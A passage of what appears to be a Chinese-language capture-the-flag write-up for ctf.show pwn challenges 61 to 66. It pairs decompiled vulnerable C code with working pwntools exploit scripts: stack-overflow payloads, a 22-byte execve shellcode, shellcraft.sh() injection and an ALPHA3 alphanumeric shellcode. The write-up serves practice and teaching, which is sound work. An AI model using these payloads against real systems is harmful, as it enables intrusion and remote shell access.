class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn61'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote(\"pwn.challenge.ctf.show\",28244)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span><span class=\"token string\">b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\"</span><span class=\"token comment\"># 22bytes</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this : [\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>v5<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shellcode:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"v5:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"But how to use it?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">24</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>v5<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>shellcode</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn62shellcode\"><a class=\"anchor\" href=\"#pwn62shellcode\">#</a> pwn62(shellcode)</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p>题目描述： <code>短了一点</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      PIE enabled\nRWX:      Has RWX segments\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FILE <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 buf<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  buf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> _bss_start<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to CTFshow!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this : [%p] ?\\n\"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Maybe it's useful ! But how to use it?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x38uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>与上面的题一样，只不过这次限制了只能读入 0x38 字节（56），栈空间 24，返回地址 8 不可用，所以最大写入的 shellcode 长度为 56-24-8=24，上道题用的 22 字节的 shellcode，所以可以直接用</p>\n<pre><code class=\"language-pyhton\">from pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\ncontext(os='linux', arch='i386', log_level='debug')\np=remote(&quot;pwn.challenge.ctf.show&quot;,28188)\n\nshellcode =b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;# 22bytes\n\np.recvuntil(&quot;What's this : [&quot;)\n\nv5=int(p.recv(14),16)\n\nprint(&quot;shellcode:&quot;,len(shellcode))\nprint(&quot;v5:&quot;,hex(v5))\n\np.recvuntil(&quot;But how to use it?\\n&quot;)\n\npayload1=b&quot;a&quot;*24+p64(v5+32)+shellcode\n\np.sendline(payload1)\n\np.interactive()\n\n</code></pre>\n<h1 id=\"pwn63shellcode\"><a class=\"anchor\" href=\"#pwn63shellcode\">#</a> pwn63(shellcode)</h1>\n<h2 id=\"题目-6\"><a class=\"anchor\" href=\"#题目-6\">#</a> 题目</h2>\n<p>题目描述： <code>又短了一点</code></p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      PIE enabled\nRWX:      Has RWX segments\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  FILE <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rdi</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __int64 buf<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  buf<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  buf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v3 <span class=\"token operator\">=</span> _bss_start<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Welcome to CTFshow!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this : [%p] ?\\n\"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Maybe it's useful ! But how to use it?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x37uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这次 0x37 字节，上面的 exp 仍然能满足</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28213</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shellcode <span class=\"token operator\">=</span><span class=\"token string\">b\"\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05\"</span><span class=\"token comment\"># 22bytes</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"What's this : [\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>v5<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"shellcode:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"v5:\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"But how to use it?\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">24</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>v5<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>shellcode</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn64shellcode\"><a class=\"anchor\" href=\"#pwn64shellcode\">#</a> pwn64(shellcode)</h1>\n<h2 id=\"题目-7\"><a class=\"anchor\" href=\"#题目-7\">#</a> 题目：</h2>\n<p>题目描述： <code>有时候开启某种保护并不代表这条路不通</code></p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n</code></pre>\n<p>32 位程序，开启了 NX</p>\n<p><code>main:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  buf <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x400u</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">alarm</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xAu</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span>_bss_start<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Some different!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x400u</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Illegal entry!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里调用了一个 <code>mmap函数</code> ，进行内存映射，并且其有执行权限（7），将其地址给 buf，后面调用 read 函数可以写入数据到 buf，当 read&gt;0 时就会执行 buf</p>\n<p>所以这里在 buf 里写入 shellcode 即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28112</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn65字符串显示的shellcode及汇编分析\"><a class=\"anchor\" href=\"#pwn65字符串显示的shellcode及汇编分析\">#</a> pwn65（字符串显示的 shellcode 及汇编分析）</h1>\n<h2 id=\"题目-8\"><a class=\"anchor\" href=\"#题目-8\">#</a> 题目</h2>\n<p>题目描述: <code>你是一个好人</code></p>\n<p>64 位程序，开启了 IPE</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Full RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      PIE enabled\nRWX:      Has RWX segments\n</code></pre>\n<p>反汇编失败</p>\n<p>大概的执行逻辑：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/VI1WO8%7B%60P6R5MZJJVKI9%40Z9.png\" alt=\"\" /></p>\n<p>这里 eax 存放读入的长度是通过 gdb 调试得出：</p>\n<p>输入了字符串 <code>aaa</code>  后变成了 4（ <code>aaa\\n</code> ）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/PTW%5B6%25_BY0B2%5D1CKWX55%7EED.png\" alt=\"\" /></p>\n<p>逻辑上判断是否是在 <code>0x61~0x7A(a-z)</code> , 再判断 <code>0x41~0x5A（A-Z）</code> ， <code>0x30~0x5a(0-Z)</code>  所以 shellcode 是需要由大小写字母及数字构成</p>\n<p>利用 alpha3 生成</p>\n<p><code>python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot; &gt; mixedcase.txt</code>  这里的参数 rax 是需要填入执行 shellcode 的那个寄存器（call rax）</p>\n<p>生成的 shellcode：</p>\n<pre><code>shellcode=Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\n</code></pre>\n<p>exp:</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn44'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28292</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>shellcode<span class=\"token operator\">=</span><span class=\"token string\">\"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn66-shellcode开头为x00\"><a class=\"anchor\" href=\"#pwn66-shellcode开头为x00\">#</a> pwn66 (shellcode 开头为 <code>\\x00</code> )</h1>\n<h2 id=\"题目-9\"><a class=\"anchor\" href=\"#题目-9\">#</a> 题目：</h2>\n<p>题目描述： <code>简单的shellcode？不对劲，十分得有十二分的不对劲</code></p>\n<p>64 位程序：</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE 